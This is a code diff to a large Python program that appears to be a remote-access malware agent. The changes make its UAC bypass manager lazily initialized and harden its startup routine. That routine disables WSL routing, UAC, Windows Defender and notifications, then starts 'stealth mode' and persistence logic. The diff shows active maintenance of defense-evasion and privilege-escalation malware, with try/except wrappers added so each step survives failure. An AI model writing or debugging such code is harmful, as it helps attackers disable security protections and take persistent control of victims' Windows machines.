@@ -1557,8 +1557,15 @@ class ICMLuaUtilBypass(UACBypassMethod):
         except Exception as e:
             raise UACBypassError(f"ICMLuaUtil COM bypass failed: {e}")
 
-# Global UAC bypass manager instance
-uac_manager = UACBypassManager()
+# Global UAC bypass manager instance (lazy-initialized to avoid RLock issues)
+uac_manager = None
+
+def get_uac_manager():
+    """Get or create the UAC bypass manager instance (lazy initialization)"""
+    global uac_manager
+    if uac_manager is None:
+        uac_manager = UACBypassManager()
+    return uac_manager
 
 def is_admin():
     """Check if the current process has admin privileges."""
@@ -1639,9 +1646,9 @@ def attempt_uac_bypass():
     
     log_message("[UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...", "info")
     
-    # Use the professional UAC Manager
-    global uac_manager
-    result = uac_manager.try_all_methods()
+    # Use the professional UAC Manager (lazy-initialized)
+    manager = get_uac_manager()
+    result = manager.try_all_methods()
     
     if result:
         log_message("✅ [UAC BYPASS] UAC bypass successful via UAC Manager!", "success")
@@ -10984,41 +10991,59 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # Add startup banner before anything else
+    print("[STARTUP] Python Agent Starting...")
+    print("[STARTUP] Initializing components...")
+    
     # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
     try:
-        log_message("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
+        print("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
         
         # 0. Disable WSL routing FIRST (fixes command execution!)
-        log_message("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
-        if disable_wsl_routing():
-            log_message("[STARTUP] ✅ WSL routing disabled - commands will use CMD.exe directly")
-        else:
-            log_message("[STARTUP] ⚠️ WSL routing disable failed (not critical)")
+        print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
+        try:
+            if disable_wsl_routing():
+                print("[STARTUP] ✅ WSL routing disabled - commands will use CMD.exe directly")
+            else:
+                print("[STARTUP] ⚠️ WSL routing disable failed (not critical)")
+        except Exception as e:
+            print(f"[STARTUP] WSL routing error: {e}")
         
         # 1. Disable UAC first (requires admin)
-        log_message("[STARTUP] Step 1: Disabling UAC...")
-        if disable_uac():
-            log_message("[STARTUP] ✅ UAC disabled successfully")
-        else:
-            log_message("[STARTUP] ⚠️ UAC disable failed (requires admin on first run)")
+        print("[STARTUP] Step 1: Disabling UAC...")
+        try:
+            if disable_uac():
+                print("[STARTUP] ✅ UAC disabled successfully")
+            else:
+                print("[STARTUP] ⚠️ UAC disable failed (requires admin on first run)")
+        except Exception as e:
+            print(f"[STARTUP] UAC disable error: {e}")
         
         # 2. Disable Windows Defender
-        log_message("[STARTUP] Step 2: Disabling Windows Defender...")
-        if disable_defender():
-            log_message("[STARTUP] ✅ Windows Defender disabled successfully")
-        else:
-            log_message("[STARTUP] ⚠️ Defender disable failed")
+        print("[STARTUP] Step 2: Disabling Windows Defender...")
+        try:
+            if disable_defender():
+                print("[STARTUP] ✅ Windows Defender disabled successfully")
+            else:
+                print("[STARTUP] ⚠️ Defender disable failed")
+        except Exception as e:
+            print(f"[STARTUP] Defender disable error: {e}")
         
         # 3. Disable Windows notifications
-        log_message("[STARTUP] Step 3: Disabling Windows notifications...")
-        if disable_windows_notifications():
-            log_message("[STARTUP] ✅ Notifications disabled successfully")
-        else:
-            log_message("[STARTUP] ⚠️ Notification disable failed")
+        print("[STARTUP] Step 3: Disabling Windows notifications...")
+        try:
+            if disable_windows_notifications():
+                print("[STARTUP] ✅ Notifications disabled successfully")
+            else:
+                print("[STARTUP] ⚠️ Notification disable failed")
+        except Exception as e:
+            print(f"[STARTUP] Notification disable error: {e}")
         
-        log_message("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
+        print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
     except Exception as e:
-        log_message(f"[STARTUP] Configuration error: {e}", "warning")
+        print(f"[STARTUP] Configuration error: {e}")
+        import traceback
+        traceback.print_exc()
     
     # Initialize basic stealth mode
     try:
@@ -11053,19 +11078,25 @@ if __name__ == "__main__":
         log_message("=" * 60)
     
     # CRITICAL FIX: Call main_unified() which contains the persistence logic
+    print("[STARTUP] Calling main_unified()...")
     try:
         main_unified()
     except KeyboardInterrupt:
-        log_message("System shutdown requested.")
+        print("System shutdown requested.")
     except ImportError as e:
-        log_message(f"Missing dependency: {e}", "error")
-        log_message("Agent will continue with limited functionality", "warning")
+        print(f"Missing dependency: {e}")
+        print("Agent will continue with limited functionality")
+        import traceback
+        traceback.print_exc()
         # Continue running with basic functionality
         while True:
             time.sleep(60)
     except Exception as e:
-        log_message(f"System error: {e}", "error")
-        log_message("Attempting to recover and continue...", "warning")
+        print(f"System error: {e}")
+        print("Full traceback:")
+        import traceback
+        traceback.print_exc()
+        print("Attempting to recover and continue...")
         # Try to recover and continue
         time.sleep(5)
     finally:
